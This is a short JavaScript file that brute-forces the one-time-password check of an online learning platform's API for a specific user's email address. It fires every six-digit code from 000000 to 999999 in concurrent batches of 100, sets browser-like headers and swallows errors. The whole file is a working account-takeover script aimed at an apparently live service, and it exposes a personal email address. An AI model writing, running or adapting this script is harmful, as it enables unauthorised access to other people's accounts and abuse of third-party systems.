import axios from 'axios';
async function sendRequest(otp) {
    let config = {
        method: 'get',
        maxBodyLength: Infinity,
        url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=anurag07raj%40gmail.com&otp=${otp}&mydeviceid=&mydeviceid2=`,
        headers: {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'auth-key': 'appxapi',
            'client-service': 'Appx',
            'device-type': '',
            'origin': 'https://harkirat.classx.co.in',
            'priority': 'u=1, i',
            'referer': 'https://harkirat.classx.co.in/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'source': 'website',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15'
        }
    };
    try {
        await axios.request(config);
    }
    catch (error) {
    }
}
async function main() {
    for (let i = 0; i < 1000000; i = i + 100) {
        const p = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            p.push(sendRequest((i + j).toString()));
        }
        await Promise.all(p);
    }
}
main();
//# sourceMappingURL=index.js.map